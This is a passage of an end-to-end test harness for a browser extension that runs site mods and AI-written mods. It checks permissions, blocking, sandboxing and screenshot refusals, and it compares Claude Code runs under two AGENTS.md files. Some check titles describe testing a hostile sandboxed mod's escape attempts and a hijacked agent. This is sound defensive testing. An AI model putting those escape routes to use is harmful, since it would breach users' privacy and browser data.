        await d.click(this.panelCtx, '#settings-btn');
        const before = await waitFor('Site permissions', () => this.panel(`async () => !document.querySelector('#settings').hidden && document.querySelector('#mode-restrictive').getAttribute('aria-pressed') === 'true' && document.querySelector('.sites-block').innerText`), { timeoutMs: 5000 });
        await this.shot(this.panelCtx, 'settings-site-permissions');
        await d.click(this.panelCtx, '#mode-permissive');
        await waitFor('<all_urls> granted', () => this.ext(`async () => chrome.permissions.contains({ origins: ['<all_urls>'] })`), { timeoutMs: 5000 });
        await waitFor('Permissive marked', () => this.panel(`async () => document.querySelector('#mode-permissive').getAttribute('aria-pressed') === 'true'`), { timeoutMs: 8000 });
        const st = (await this.cli(['status'], { json: true })).json.extension;
        if (st.siteMode !== 'permissive' || st.disconnected.length) throw new Error(`status: ${JSON.stringify([st.siteMode, st.disconnected])}`);
        await d.click(this.panelCtx, '#settings-btn');
        this.restrictive = false;
        return before.replace(/\n+/g, ' / ');
      });
    }

    // Permissive (upgrading, or fresh Firefox from here on): Disconnect can't take one site out of every
    // site, so a card offers restrictive mode; × and Escape close it, doing nothing. (Switching is checked at
    // the end in Firefox; Chrome's upgrade test build has <all_urls> as a required host, which can't go.)
    if (!this.restrictive) {
      await r.check('permissive: "Disconnect from 127.0.0.1" opens a card in the panel offering restrictive mode; × and Escape close it, nothing changes', async () => {
        await offAgain();
        await d.click(this.panelCtx, '#gate-disconnect');
        const p = await this.waitPanel('the card', (x) => !!x.dialog);
        const lines = p.dialog.split('\n').map((l) => l.trim()).filter(Boolean);
        if (JSON.stringify(lines) !== JSON.stringify(['×', 'All-site access is on', 'You\'ll have to allow TRIF again on other sites.', 'Switch to restrictive mode'])) {
          await this.panel(`async () => document.querySelector('#mode-dialog').close()`);
          throw new Error(`the card says: ${JSON.stringify(p.dialog)}`);
        }
        await this.shot(this.panelCtx, 'panel-permissive-disconnect-dialog');
        await d.click(this.panelCtx, '#mode-dialog-close');
        await this.waitPanel('the card closed (×)', (x) => !x.dialog);
        await d.click(this.panelCtx, '#gate-disconnect');
        await this.waitPanel('the card again', (x) => !!x.dialog);
        await d.key(this.panelCtx, 'Escape');
        await this.waitPanel('the card closed (Escape)', (x) => !x.dialog);
        const st = (await this.cli(['status'], { json: true })).json.extension;
        if (st.siteMode !== 'permissive' || !(await hasSite())) throw new Error(`changed: ${JSON.stringify(st.siteMode)}`);
        await d.click(this.panelCtx, '#gate-btn');
        await this.waitPage('the mod again', (x) => x.banner === 'ran');
        return lines.slice(1).join(' / ');
      });
    }

    // Blocked in TRIF (both modes): nothing from TRIF touches the site whatever access it has; the panel red,
    // and Unblock; Settings lists it.
    await r.check('"Block on 127.0.0.1": the mod stops, agents are refused, the panel red with Unblock, Settings lists it; Unblock, then Fix (or Connect) turns it on', async () => {
      await offAgain();
      await d.click(this.panelCtx, '#gate-block');
      const p = await this.waitPanel('the red panel', (x) => x.gate && x.gateTitle === 'The robot is blocked on 127.0.0.1');
      if (p.gateText !== 'Unblock' || !p.red || p.grey || p.links.length) throw new Error(`the gate: ${JSON.stringify(p)}`);
      await this.shot(this.panelCtx, 'panel-blocked');
      for (const args of [['text', '--url', '127.0.0.1'], ['screenshot', '--url', '127.0.0.1', '-o', path.join(this.work, 'blocked.png')], ['run', '--url', '127.0.0.1', '1']]) {
        const x = await this.cli(args);
        if (x.status === 0 || !/127\.0\.0\.1 is blocked in TRIF: nothing from TRIF runs there or reads it/.test(x.stderr)) throw new Error(`trif ${args[0]}: ${x.status} ${x.stderr}`);
      }
      const st = (await this.cli(['status'], { json: true })).json.extension;
      if (JSON.stringify(st.blockedSites) !== '["127.0.0.1"]' || st.sitesOn.includes('127.0.0.1')) throw new Error(`status: ${JSON.stringify([st.blockedSites, st.sitesOn])}`);
      const text = await this.cli(['status']);
      if (!/^blocked {7}127\.0\.0\.1: blocked in TRIF/m.test(text.stdout)) throw new Error(`trif status: ${text.stdout}`);
      await d.click(this.panelCtx, '#settings-btn');
      const listed = await waitFor('the blocked sites', () => this.panel(`async () => { const li = [...document.querySelectorAll('#blocked-list li')]; return !document.querySelector('#settings').hidden && li.length ? li.map((x) => x.textContent) : null; }`), { timeoutMs: 5000 });
      if (this.o.browser !== 'firefox' || this.allSites) await this.shot(this.panelCtx, 'settings-site-permissions');
      await d.click(this.panelCtx, '#settings-btn');
      await d.click(this.panelCtx, '#gate-btn');
      // Unblocked: off (TRIF has the site), or grey (restrictive Firefox gave its access back when blocking).
      const after = await this.waitPanel('the gate after', (x) => x.gate && !x.red);
      if (!['The robot is off.', 'TRIF is disconnected on 127.0.0.1'].includes(after.gateTitle)) throw new Error(`after: ${JSON.stringify(after)}`);
      await d.click(this.panelCtx, '#gate-btn');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      return `listed: ${listed.join(', ')}; after: "${after.gateTitle}"`;
    });

    await r.check('the robot in the top bar: on a site TRIF is on for, it puts it to sleep like the power button; on the gate, it wakes it like Fix', async () => {
      const all = ['#dot', '#site', '#bar-robot', '#site-switch', '#new-chat', '#settings-btn'];
      const on = await this.waitBar('the bar on a site TRIF is on for', all, Scenario.awake);
      if (on.robotLabel !== 'Turn the robot off for 127.0.0.1' || on.robotLabel !== on.switchLabel) throw new Error(`labelled "${on.robotLabel}" (the power button: "${on.switchLabel}")`);
      await d.click(this.panelCtx, '#bar-robot');
      await this.waitPanel('the gate', (x) => x.gate && !x.siteOn);
      await this.waitPage('the page without the mod', (x) => !x.banner);
      // The mouse is still on him: grey, but brighter than at rest; moved away, dim.
      const lit = await this.waitBar('the gate\'s bar, the robot under the mouse', GATE_BAR, Scenario.stirring);
      await d.pointerAway(this.panelCtx);
      const rest = await this.waitBar('the gate\'s bar, the mouse elsewhere', GATE_BAR, Scenario.dim);
      await d.click(this.panelCtx, '#bar-robot');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      await this.waitPanel('the panel awake, the mod on and running', (x) => !x.gate && x.siteOn && x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.on && m.running));
      await this.waitBar('the whole bar again', all, Scenario.awake);
      return `off and on again from the robot; the mod stopped and ran again; asleep ${rest.filter} ${rest.opacity}, under the mouse ${lit.filter} ${lit.opacity}`;
    });

    await r.check('panel follows tab switches and navigation', async () => {
      const other = await this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: true })).id`, [`http://localhost:${port}/?e2e=2`, win.windowId]);
      await this.waitPanel('the panel to follow to localhost', (x) => x.site === 'localhost' && x.gate);
      const lp = await this.d.findPage(`localhost:${port}`);
      const ls = await this.d.eval(lp, `async () => document.documentElement.dataset.trifE2eOff || null`);
      if (ls) throw new Error('the localhost mod ran though TRIF is off there');
      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
      await this.waitPanel('the panel to follow back to 127.0.0.1', (x) => x.site === '127.0.0.1' && !x.gate);
      // The message box keeps a draft per tab: what's typed in one tab doesn't show up in another.
      const typeIn = (text) => this.panel(`async (t) => { const i = document.querySelector('#input'); i.value = t; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [text]);
      const boxText = () => this.panel(`async () => document.querySelector('#input').value`);
      await typeIn('left in the test page');
      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [other]);
      await this.waitPanel('the panel to follow to localhost again', (x) => x.site === 'localhost');
      if ((await boxText()) !== '') throw new Error(`the other tab's draft showed up on localhost: ${JSON.stringify(await boxText())}`);
      await typeIn('left on localhost');
      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
      await this.waitPanel('the panel back to 127.0.0.1 again', (x) => x.site === '127.0.0.1' && !x.gate);
      if ((await boxText()) !== 'left in the test page') throw new Error(`127.0.0.1's draft not back: ${JSON.stringify(await boxText())}`);
      await typeIn('');
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `${base}/two.html`]);
      await this.waitPage('page two with the mod', (x) => x.url.endsWith('/two.html') && x.banner === 'ran');
      await this.waitPanel('the panel on page two', (x) => x.site === '127.0.0.1' && x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.running));
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `http://localhost:${port}/?e2e=3`]);
      await this.waitPanel('the panel to follow the navigation to localhost', (x) => x.site === 'localhost');
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `${base}/?e2e=4`]);
      await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [other]).catch(() => {});
      await this.waitPage('back on the test page', (x) => x.url.includes('e2e=4') && x.banner === 'ran');
      await this.waitPanel('the panel back on 127.0.0.1', (x) => x.site === '127.0.0.1');
    });

    await r.check('mods over 1 MB in all (a 1 MB mod, 0.4 MB of code) reach the page in parts; a change sends only that mod; one over 4 MB isn\'t sent, and says why', () => this.bigModsCheck());

    // ---- Detox Timeline (x.com/detox-timeline) against the X stand-in
    await r.check('Detox Timeline filters a saved X home timeline (fetch and XHR)', async () => {
      const xUrl = `https://x.com:${tlsPort}/home`;
      const xtab = await this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: true })).id`, [xUrl, win.windowId]);
      this.xTab = xtab;
      const ctx = await d.findPage(`x.com:${tlsPort}`);
      this.xCtx = ctx;
      const st = await waitFor('the X stand-in to load its timeline', async () => {
        const s = await d.eval(ctx, `async () => ({ loaded: !!window.__xLoaded, error: window.__xError || null, guard: !!window.__dmGuard,
          fetch: [...document.querySelectorAll('#fetch-list li')].map((li) => li.dataset.entry),
          xhr: [...document.querySelectorAll('#xhr-list li')].map((li) => li.dataset.entry) })`);
        return s.loaded || s.error ? s : null;
      });
      await this.shot(ctx, 'detox-timeline');
      if (st.error) throw new Error(`the page failed: ${st.error}`);
      if (!st.guard) throw new Error('Detox Timeline didn\'t run (no window.__dmGuard)');
      const want = JSON.stringify(timeline.kept);
      if (JSON.stringify(st.fetch) !== want) throw new Error(`fetch got ${JSON.stringify(st.fetch)}, want ${want}`);
      if (JSON.stringify(st.xhr) !== want) throw new Error(`XHR got ${JSON.stringify(st.xhr)}, want ${want}`);
      const reqs = this.o.servers.requests.filter((q) => q.host === 'x.com' && q.url.includes('HomeLatestTimeline'));
      const ranked = reqs.filter((q) => /enableRanking%22%3Atrue|"enableRanking":true/.test(decodeURIComponent(q.url)));
      if (!reqs.length) throw new Error('no timeline requests reached the server');
      if (ranked.length) throw new Error(`requests still asked for ranking: ${ranked.map((q) => q.url).join(', ')}`);
      const errs = await this.cli(['errors', '--url', 'x.com'], { json: true });
      if (errs.json && errs.json.length) throw new Error(`mod errors: ${JSON.stringify(errs.json)}`);
      return `kept ${st.fetch.join(', ')} of ${timeline.all.length}; ${reqs.length} requests rewritten to Recent`;
    });

    await r.check('panel on x.com lists the shipped mods' + (this.o.kind === 'upgrade' ? ' and offers the edited one\'s update' : ''), async () => {
      const p = await this.waitPanel('the panel on x.com', (x) => x.site === 'x.com' && x.mods.length >= 3);
      const px = p.mods.find((m) => m.id === 'x.com/detox-timeline');
      if (!px || !px.on || !px.running) throw new Error(`detox-timeline: ${JSON.stringify(px)}`);
      if (!px.source || !/^Tim's mod, v\d+$/.test(px.source)) throw new Error(`detox-timeline isn't marked as Tim's mod: ${px.source}`);
      if (this.o.kind === 'upgrade') {
        const pf = p.mods.find((m) => m.id === 'x.com/rainbow-rave');
        if (!pf || !pf.update) throw new Error(`no update notice on rainbow-rave: ${JSON.stringify(pf)}`);
        await this.shot(this.panelCtx, 'panel-x-update');
        return `rainbow-rave: "${pf.update.split('\n')[0]}"`;
      }
      await this.shot(this.panelCtx, 'panel-x');
      return p.mods.map((m) => `${m.id.split('/')[1]} ${m.on ? 'on' : 'off'}`).join(', ');
    });
    await this.starterSettingsCheck();
    await this.starterLinkCheck(win);
    await this.narrowShots();
    await this.colourChecks().catch((e) => r.check('colour checks', () => { throw e; }));
    if (!this.o.oss) await r.check('open model key: saved, then Replace (and Cancel) and Remove', () => this.openModelKey());
    await this.sweepAndScreenshotChecks(base, win);
    if (this.o.kind === 'upgrade') await this.mergeChecks();
    await r.check('AI Banisher and Just Results on the Google stand-ins (results and home page)', () => this.googleChecks(win));
    await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [this.xTab]).catch(() => {});
    await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]).catch(() => {});

    await r.check('setup page: all ticked once the agent can run, then "TRIF is ready" and Try it', () => this.setupDoneCheck());
    if (this.o.browser === 'firefox') await this.restrictiveAgainCheck();
    // (A stand-in Claude Code: only when the helper has the scratch HOME, never your real agent.)
    if (!this.o.agent && !this.o.codex && !this.o.oss && !this.o.guidance) {
      await r.check('an expired login (a stand-in Claude Code): the login notice and one plain line, not the raw error; the message back in the box', () => this.expiredLoginCheck(win));
      await r.check('a style mod: TRIF\'s own code applies its CSS, hides, replaces and filters (also what appears later); one that would load from an address is refused, not sent', () => this.rulesModCheck(win));
      await r.check('groups: "Free mods" off on a site from the panel stops its free mods there (style mods keep running, other sites\' free mods untouched); on again, back', () => this.groupsCheck(win));
      await r.check('boxed mods: a hostile one fails at every escape (network, code from strings, inline code, other windows and the page\'s globals, synthetic input, navigation, clipboard, cookies and storage, messages), with nothing reaching the server or the page; a good one restyles, hides, adds, rewrites text, draws, uses timers and settings, and watches; errors and logs reported; the two sample ports work; timing', () => this.sandboxedCheck(win));
      await r.check('a boxed mod as a free mod (how a browser without the sandbox runs one the user allowed): the same API works in the page\'s world', () => this.sandboxPageFormCheck(win));
      await r.check('powers (docs/POWERS.md): a boxed mod with powers waits for the user\'s OK for its set (panel and trif status say what it asks for); allowed, sound, controls, read-drafts and keys work and stay narrow; undeclared, each is refused; a new version with the same powers runs, one with a new power waits for that one', () => this.powersCheck(win));
      await r.check('"Agent on this site": Ask asks in the panel (Just this once runs the code), Look refuses code, Off refuses reading too, a sensitive site is off with its line, Settings lists them', () => this.agentSitesCheck(win));
      await r.check('the code card: a mod\'s </> and its file name open its code (a style mod: its rules), with line numbers; Copy copies it; Show in Finder and Open in editor ask the helper, which reveals the mod\'s own file (a stand-in for open here); Esc closes it', () => this.codeViewCheck(win));
      await r.check('powers, phase 3: media plays and pauses the page\'s own video; click clicks only what the header names, never a submit, reset or a link to another site; go-to goes only to the header\'s pages; mods talk over TRIF\'s channel in plain data; write-drafts changes the user\'s drafts but never a password, card or hidden field; with a read, the combination is in the hold, and while another boxed mod on the page has a read it didn\'t ask for, write-drafts is off; undeclared, each is refused', () => this.powers3Check(win));
      await r.check('powers, phase 2: site-data filters the site\'s JSON (fetch and XHR) by removing and reordering only (an invented string, number, key, a duplicate or a cut string: TRIF keeps the original); page-data reads plain copies of React props; search-box is TRIF\'s own box the mod can\'t read, which searches the site from the user\'s Enter; undeclared, each is refused', () => this.powers2Check(win));
      await r.check('speculation rules (audit AU-7): a page that prefetches its same-site links at once; a link a free mod adds is fetched without a click (Chrome), a boxed mod can\'t make one', () => this.specRulesCheck(win));
      await r.check('boxed mods in the panel: their own group between Style mods and Free mods, with its switch (off on the site: they stop there; on: back), and "New mods start" has a Boxed mods row', () => this.sandboxedPanelCheck(win));
      await r.check('Settings → New mods start → Free mods Off: a new free mod arrives off, marked "new", and doesn\'t run; a new style mod runs; switched on in the panel, it runs; Free mods On again', () => this.startsOffCheck(win));
      await r.check('a hijacked agent (a stand-in Claude Code): the tab it ran code in sends nothing that changes anything until it reloads, even later; its mod that posts is held by its code, whatever its header says', () => this.hijackedAgentCheck(win));
    }

    if (this.o.agent) await this.agentChecks('claude');
    if (this.o.codex) await this.agentChecks('codex');
    if (this.o.oss) await this.agentChecks('oss');
    if (this.o.guidance) await this.guidanceComparison(base);
  }

  // ---- the shipped Google mods against the stand-ins (tests/e2e/lib/server.js): every data-e2e="hide…"
  // element hidden, every "keep…" one still showing, in a background tab.
  /**
   * Firefox, permissive: "Switch to restrictive mode" in the card Disconnect opens gives every site's access
   * back, no prompt: 127.0.0.1 goes grey, as every other site; Connect brings it back (the prompt is off).
   */
  async restrictiveAgainCheck() {
    const r = this.r;
    const d = this.d;
    await r.check('permissive → "Switch to restrictive mode" (the card): every site\'s access goes, the panel grey; Connect brings 127.0.0.1 back', async () => {
      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [this.win.tabId]);
      await this.waitPanel('the panel on 127.0.0.1', (x) => x.site === '127.0.0.1' && !x.gate);
      await d.click(this.panelCtx, '#site-switch');
      await this.waitPanel('the off screen', (x) => x.gate && x.gateTitle === 'The robot is off.');
      await d.click(this.panelCtx, '#gate-disconnect');
      await this.waitPanel('the card', (x) => !!x.dialog);
      await d.click(this.panelCtx, '#mode-dialog-switch');
      const p = await this.waitPanel('the grey panel', (x) => x.gate && x.gateTitle === 'TRIF is disconnected on 127.0.0.1' && !x.dialog);
      if (!p.grey) throw new Error(`not grey: ${JSON.stringify(p)}`);
      const origins = await this.ext(`async () => (await chrome.permissions.getAll()).origins`);
      const st = (await this.cli(['status'], { json: true })).json.extension;
      if (origins.length || st.siteMode !== 'restrictive' || !st.disconnected.includes('x.com')) throw new Error(`after: ${JSON.stringify([origins, st.siteMode, st.disconnected])}`);
      await d.click(this.panelCtx, '#gate-btn');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      return `granted after: none; disconnected: ${st.disconnected.join(', ')}`;
    });
  }

  async googleChecks(win) {
    const d = this.d;
    const { tlsPort } = this.o.servers;
    const out = [];
    for (const [pathName, at] of [['/search?q=trif', 'results'], ['/', 'home']]) {
      const url = `https://www.google.com:${tlsPort}${pathName}`;
      const tab = await this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: false })).id`, [url, win.windowId]);
      try {
        const ctx = await d.findPage((u) => u === url);
        let st;
        try {
          st = await waitFor(`the mods on the Google ${at} page`, async () => {
            const s = await d.eval(ctx, `async () => document.readyState === 'complete'
              ? [...document.querySelectorAll('[data-e2e]')].map((e) => [e.dataset.e2e, e.getClientRects().length > 0]) : null`);
            return s && s.length && s.every(([name, shown]) => name.startsWith('keep') === shown) ? s : null;
          }, { timeoutMs: 15000 });
        } catch (e) {
          const s = await d.eval(ctx, `async () => [...document.querySelectorAll('[data-e2e]')].map((e) => [e.dataset.e2e, e.getClientRects().length > 0])`).catch(() => []);
          const wrong = s.filter(([name, shown]) => name.startsWith('keep') !== shown).map(([name, shown]) => `${name} ${shown ? 'showing' : 'hidden'}`);
          await this.shot(ctx, `google-${at}`);
          throw new Error(`on the ${at} page: ${wrong.join(', ') || e.message}`);
        }
        await this.shot(ctx, `google-${at}`);
        out.push(`${at}: ${st.filter(([n]) => n.startsWith('hide')).length} hidden, ${st.filter(([n]) => n.startsWith('keep')).length} kept`);
      } finally {
        await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [tab]).catch(() => {});
      }
    }
    const errs = await this.cli(['errors', '--url', 'www.google.com'], { json: true });
    if (errs.json && errs.json.length) throw new Error(`mod errors: ${JSON.stringify(errs.json)}`);
    return out.join('; ');
  }

  // ---- --guidance: the same requests with the AGENTS.md from main and the one in this checkout, with
  // a real Claude Code run each (no pass/fail: what each run found, checked and said, in the log)

  async guidanceComparison(base) {
    const r = this.r;
    const model = this.o.claudeModel || 'haiku';
    const repeats = this.o.guidanceRepeats || 1;
    const sitesDir = path.join(this.trif, 'sites', '127.0.0.1');
    const agentsFile = path.join(this.trif, 'AGENTS.md');
    const guides = {
      old: run('git', ['show', 'main:helper/workspace/AGENTS.md'], { cwd: I.REPO }).stdout,
      new: fs.readFileSync(path.join(I.REPO, 'helper', 'workspace', 'AGENTS.md'), 'utf8'),
    };
    if (!guides.old) { r.note('--guidance: no AGENTS.md on main'); return; }
    // Only the agent's own mods on the page (the harness's banner off).
    await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [this.win.tabId, `${base}/promos.html`]);
    await sleep(1500);
    // (--force: it's the tab in front, and sweep --scroll won't scroll that one otherwise)
    const sweep = async (...args) => (await this.cli(['sweep', '--url', 'promos.html', '--scroll', '--force', ...args], { json: true })).json;
    // Ground truth after a run: visible "Promoted" labels (lazy ones loaded by scrolling), visible posts,
    // visible elements still using the blue.
    const measure = async () => {
      await this.cli(['reload', '--url', 'promos.html']);
      await sleep(800);
      const promos = await sweep('--text', '^Promoted');
      const posts = await sweep('--text', '^Post \\d');
      const blue = await sweep('--color', '#0a66c2');
      const left = (j) => (j ? j.matches.filter((x) => x.visible).map((x) => `${x.element}${x.root !== 'document' ? ' (shadow)' : ''}${x.props ? ` ${x.props.map((p) => (p.pseudo || '') + p.prop).join(',')}` : ` "${x.text}"`}`) : null);
      return {
        promos: promos ? promos.summary.visible : null, posts: posts ? posts.summary.visible : null, blue: blue ? blue.summary.visible : null,
        promosLeft: left(promos), blueLeft: left(blue),
      };
    };
    const base0 = await measure();
    r.log(`--guidance baseline: ${JSON.stringify(base0)}`);
    const tasks = [
      { key: 'promos', prompt: 'hide the promos, like the "Promoted · Deal 1" one' },
      { key: 'pink', prompt: 'make the blue stuff pink' },
    ];
    const rows = [];
    for (let rep = 0; rep < repeats; rep++) {
      for (const task of tasks) {
        for (const which of ['old', 'new']) {
          fs.writeFileSync(agentsFile, guides[which]);
          const gone = [];
          for (const f of fs.readdirSync(sitesDir)) if (f.endsWith('.js') && f !== 'e2e-banner.js') { fs.renameSync(path.join(sitesDir, f), path.join(this.work, `done-${which}-${task.key}-${rep}-${f}`)); gone.push(`127.0.0.1/${f.slice(0, -3)}`); }
          // The last run's mods must be unregistered before this run looks at the page.
          await waitFor('the last run\'s mods to go', async () => {
            const st = (await this.cli(['status', '--url', 'promos.html'], { json: true })).json;
            const on = (st && st.extension && st.extension.page && st.extension.page.mods || []).map((x) => x.id);
            return gone.some((id) => on.includes(id)) ? null : true;
          }, { timeoutMs: 20000 });
          await this.cli(['reload', '--url', 'promos.html']);
          await sleep(800);
          const t0 = Date.now();
          const tab = ((await this.cli(['tabs'], { json: true })).json || []).find((t) => t.url.includes('promos.html'));
          const out = await this.cli(['agent', 'run', '--agent', 'claude', '--model', model, '--tab', String(tab && tab.id), task.prompt], { timeoutMs: 10 * 60000 });
          const secs = Math.round((Date.now() - t0) / 1000);
          const m = await measure();
          const transcript = `${out.stdout}\n${out.stderr}`;
          const file = this.r.file(`guidance-${task.key}-${which}-${rep}.txt`);
          fs.writeFileSync(file, transcript);
          const mods = fs.readdirSync(sitesDir).filter((f) => f.endsWith('.js') && f !== 'e2e-banner.js');
          const row = {
            task: task.key, guide: which, rep, secs, cost: (/\$([\d.]+)/.exec(transcript.split('\ndone:').pop() || '') || [])[1] || null,
            ...m, sweeps: (transcript.match(/\[\w+\][^\n]*trif sweep/g) || []).length, mods,
          };
          rows.push(row);
          r.record(`--guidance ${task.key} with the ${which} AGENTS.md (${model})`, 'pass', JSON.stringify(row));
        }
      }
    }
    r.log(`--guidance rows:\n${rows.map((x) => JSON.stringify(x)).join('\n')}`);
    fs.writeFileSync(this.r.file('guidance.json'), JSON.stringify({ baseline: base0, rows }, null, 2));
    fs.writeFileSync(agentsFile, guides.new);
    await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
  }

  // ---- trif sweep on a page of repeated things, and screenshots of a tab that isn't showing

  async sweepAndScreenshotChecks(base, win) {
    const r = this.r;
    const d = this.d;
    const E = SWEEP_EXPECT;
    const url = `${base}/sweep.html`;
    // In the background of the test window, as `trif open` does: the test tab stays in front.
    const opened = await this.cli(['open', url], { json: true });
    const sweepTab = opened.json && opened.json.id;
    if (!sweepTab) { r.note(`trif open ${url} failed: ${opened.stderr || opened.stdout}`); return; }
    await sleep(500);
    const sweep = async (...args) => {
      const x = await this.cli(['sweep', '--tab', String(sweepTab), ...args], { json: true });
      if (x.status !== 0 || !x.json) throw new Error(`trif sweep ${args.join(' ')}: ${x.stderr || x.stdout}`);
      return x.json;
    };
    await r.check('trif sweep --selector finds every instance: regions, shadow root, frame, hidden', async () => {
      const j = await sweep('--selector', '.promo');
      const s = j.summary;
      if (j.total !== E.promo) throw new Error(`${j.total} matches, want ${E.promo}: ${JSON.stringify(j.matches.map((m) => m.text))}`);
      if (s.inShadowRoots !== E.shadow || s.inFrames !== E.frames || s.hidden !== E.hidden || s.sticky !== E.sticky) throw new Error(`summary ${JSON.stringify(s)}`);
      if (!s.regions.main || !s.regions.aside || !Object.keys(s.regions).some((k) => k.startsWith('header'))) throw new Error(`regions ${JSON.stringify(s.regions)}`);
      const text = await this.cli(['sweep', '--tab', String(sweepTab), '--selector', '.promo']);
      r.log(text.stdout);
      return `${j.total} matches; ${Object.entries(s.regions).map(([k, v]) => `${k} ${v}`).join(', ')}; ${j.scanned.ms} ms`;
    });
    await r.check('trif sweep --text and --color: the same promos by their words; the blue, its rules and variable', async () => {
      const t = await sweep('--text', 'sponsored');
      if (t.total !== E.sponsored) throw new Error(`--text: ${t.total} matches, want ${E.sponsored}`);
      const c = await sweep('--color', '#1d9bf0');
      const got = c.matches.map((m) => `${m.element} ${m.props.map((p) => `${p.pseudo || ''}${p.prop}`).join(',')}`);
      if (c.total !== E.blue) throw new Error(`--color: ${c.total} matches, want ${E.blue}: ${JSON.stringify(got)}`);
      if (!c.rules || !c.rules.variables.some((v) => v.name === '--brand' && v.uses >= 1)) throw new Error(`no --brand variable in ${JSON.stringify(c.rules)}`);
      if (!c.rules.list.some((x) => x.selector === '.promo')) throw new Error(`the shadow root's .promo rule is missing: ${JSON.stringify(c.rules.list)}`);
      return `text ${t.total}; colour ${c.total} (${got.join('; ')}); ${c.rules.total} rules, ${c.rules.variables.length} variable`;
    });
    await r.check('trif status --tab lists the mods running on that page', async () => {
      const x = await this.cli(['status', '--tab', String(sweepTab)], { json: true });
      const page = x.json && x.json.extension && x.json.extension.page;
      if (!page || !page.mods.some((m) => m.id === '127.0.0.1/e2e-banner')) throw new Error(`page: ${JSON.stringify(page)} ${x.stderr}`);
      return page.mods.map((m) => m.id).join(', ');
    });
    // The user's view, which no screenshot may change.
    const view = () => this.ext(`async () => {
      const wins = await chrome.windows.getAll({ populate: true });
      const focused = await chrome.windows.getLastFocused().catch(() => null);
      return { focused: focused && focused.id, windows: wins.length, active: wins.map((w) => [w.id, (w.tabs.find((t) => t.active) || {}).id]).sort((a, b) => a[0] - b[0]) };
    }`);
    const pngSize = (file) => { const b = fs.readFileSync(file); return b.subarray(1, 4).toString() === 'PNG' ? { w: b.readUInt32BE(16), h: b.readUInt32BE(20), bytes: b.length } : null; };
    const chrome = this.o.browser !== 'firefox';
    // Restrictive (Chrome's fresh test build: only the sites the user connected), Chrome's and Firefox's tab
    // capture want activeTab, from a click on TRIF's toolbar button on that tab (extension/screenshot.js).
    if (chrome && !this.allSites) {
      await r.check('without access to every site: trif screenshot of a tab that isn\'t showing (--full, --copy) is refused with a hint, nothing opened', async () => {
        const before = await view();
        const results = [];
        for (const extra of [[], ['--full'], ...(chrome ? [['--copy'], ['--copy', '--full']] : [])]) {
          const x = await this.cli(['screenshot', '--tab', String(sweepTab), ...extra, '-o', path.join(this.work, 'refused.png')]);
          if (x.status === 0) throw new Error(`trif screenshot ${extra.join(' ')} worked`);
          if (!/access to every site/.test(x.stderr) || !/toolbar button/.test(x.stderr) || !/trif sweep/.test(x.stderr)) throw new Error(`no hint: ${x.stderr}`);
          results.push(x.stderr.trim().split('\n')[0]);
        }
        const after = await view();
        if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`the user's view changed: ${JSON.stringify(before)} -> ${JSON.stringify(after)}`);
        return results[0];
      });
    }
    if (chrome && !this.allSites) {
      await r.check('without access to every site (Chrome): the tab in front is refused until the user clicks the toolbar button on it, then captured', async () => {
        // The test tab, in front in its window (earlier checks may have left another tab there).
        const was = await this.ext(`async (w) => (await chrome.tabs.query({ active: true, windowId: w }))[0]?.id ?? null`, [this.win.windowId]);
        const front = await this.ext(`async (id) => { const t = await chrome.tabs.update(id, { active: true }); return t.url; }`, [this.win.tabId]);
        const tab = String(this.win.tabId);
        const file = this.r.file(`${this.label}-${String(++this.shots).padStart(2, '0')}-trif-screenshot-front.png`);
        const no = await this.cli(['screenshot', '--tab', tab, '-o', file]);
        if (no.status === 0 || !/only after the user clicks the TRIF toolbar button on it/.test(no.stderr)) throw new Error(`before the click: ${no.status} ${no.stderr}`);
        const ctx = await d.findPage((u) => u === front);
        await d.clickToolbarButton(ctx);
        await sleep(500);
        const x = await this.cli(['screenshot', '--tab', tab, '-o', file], { json: true, timeoutMs: 30000 });
        if (x.status !== 0 || !x.json || x.json.how !== 'visible') throw new Error(`after the click: ${x.stderr || x.stdout}`);
        const size = pngSize(file);
        if (!size || size.w < 200 || size.bytes < 3000) throw new Error(`not much of a PNG: ${JSON.stringify(size)}`);
        await d.clickToolbarButton(ctx).catch(() => {}); // (the click opened the side panel: closed again)
        if (was !== null && was !== this.win.tabId) await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [was]).catch(() => {});
        return `refused before: ${no.stderr.trim().split('\n')[0].slice(0, 120)}…; after: ${size.w}x${size.h}`;
      });
    }
    if (chrome && this.allSites) {
      await r.check('trif screenshot of a tab that isn\'t showing, without --copy (Chrome): refused with the hint, nothing opened', async () => {
        const before = await view();
        const results = [];
        for (const extra of [[], ['--full']]) {
          const x = await this.cli(['screenshot', '--tab', String(sweepTab), ...extra, '-o', path.join(this.work, 'refused.png')]);
          if (x.status === 0) throw new Error(`trif screenshot ${extra.join(' ')} worked without --copy`);
          if (!/--copy/.test(x.stderr) || !/trif sweep/.test(x.stderr)) throw new Error(`no hint: ${x.stderr}`);
          results.push(x.stderr.trim().split('\n')[0]);
        }
        const after = await view();
